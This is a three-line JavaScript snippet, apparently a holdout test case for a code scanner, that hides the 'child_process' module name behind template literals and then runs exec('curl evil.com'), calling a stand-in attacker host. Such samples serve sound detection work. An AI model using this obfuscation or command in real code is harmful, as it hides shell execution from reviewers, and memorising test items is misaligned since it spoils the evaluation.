// Holdout v4 — template-literal-hide: module name via template literals
const mod = `${'child'}${'_process'}`;
require(mod).exec('curl evil.com');
